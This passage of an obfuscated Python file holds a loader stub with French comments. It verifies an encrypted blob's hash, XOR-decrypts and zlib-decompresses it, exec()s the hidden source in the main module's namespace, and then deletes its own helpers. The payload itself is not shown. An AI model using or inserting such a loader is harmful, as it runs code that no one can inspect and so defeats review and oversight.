_cw16t6tccQjBOt + _ciV3cZL0qtjSNb + _cdSbbKCMrskGWa + _cnxSaq2xbC1O9w + _cziXLE2nG4tuHa + _cz7MdS3nUds_yE + _cukN0HH59sMF0u + _cnuF7Xpi21HmWp + _cgeiz0MWzKhO10 + _cwR_SW6Lr4x7pn + _ctnMXlx7jas3or + _crE7YRuagpi5fN + _cxYk31obY81nFv + _cm8sdiLDRkoMCn + _ci5L5p5KwzPGSI + _cbX0J_lYpUPiT_ + _cxrlVVVXSHY6Bq + _cztZLMhSnYvGHv + _cilzAewA_7s_6P + _cuDTe4ltaxGXqW + _cg1rDYIuCF09HY + _ceyPCzk4es7b6w + _cr58d48w7cnMjC + _ceYTZzigf5XnBI + _cptJu6o2F89LCJ + _ctTT9ZTTwhVwHO + _cjZCCedzOM_kEj + _cfTBaoPtRX1s9O + _cgda_J0ykTntDu + _co_eiN9_bXotzz + _czoNXEWCWNRRI3 + _cv7rj0vP_tenF5 + _co9kZlPDOmdTLC + _c_1t276RIQ02wp + _ctkPg8g2ZjuqG7 + _cpmkPRU72fF0xo)
if __import__('hashlib').sha256(_pvMeCF0tKfFufK).hexdigest() != 'ae1eb438c894ad33928738bf53ac885d8f062ef27023fa43e3ee2becc235a0c3':
    __import__('sys').exit(1)
_xar_u88aL7NFgf = bytes([163, 203, 209, 59, 239, 235, 7, 78, 84, 40, 209, 209, 217, 29, 218, 225, 216, 178, 22, 179])
_fkbGqdJN0__XcO2 = bytes([131, 58, 196, 128, 120, 105, 64, 133, 108, 214, 88, 15, 55, 140, 47, 11, 30, 2, 26, 85])

def _fxlJapwcMBI1q3D(_bs806efs22odQD, _k_hcgSWXin5ixb):
    return bytes(_bs806efs22odQD[_isc0GI1LHN3j2y] ^ _k_hcgSWXin5ixb[_isc0GI1LHN3j2y % len(_k_hcgSWXin5ixb)] for _isc0GI1LHN3j2y in range(len(_bs806efs22odQD)))

def _fdarZY5faPYBs5P(_ttEKPIK9rX4A3C):
    import zlib
    return zlib.decompress(_ttEKPIK9rX4A3C) # Un seul niveau de zlib ici pour simplifier

def _fekkflTaRZ_K9V4():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xtFKpmTMRZ_m7O = _fxlJapwcMBI1q3D(_pvMeCF0tKfFufK, _xar_u88aL7NFgf)
    # 2. Décompression Zlib
    _dm1tYPWlQSbJOK = _fdarZY5faPYBs5P(_xtFKpmTMRZ_m7O)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dm1tYPWlQSbJOK.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nilJmuXiMbPMl3 = _main.__dict__
    _nilJmuXiMbPMl3.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nilJmuXiMbPMl3)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fekkflTaRZ_K9V4()
try:
    del _fxlJapwcMBI1q3D, _fdarZY5faPYBs5P, _fekkflTaRZ_K9V4
    del _pvMeCF0tKfFufK, _xar_u88aL7NFgf, _fkbGqdJN0__XcO2
except:
    pass
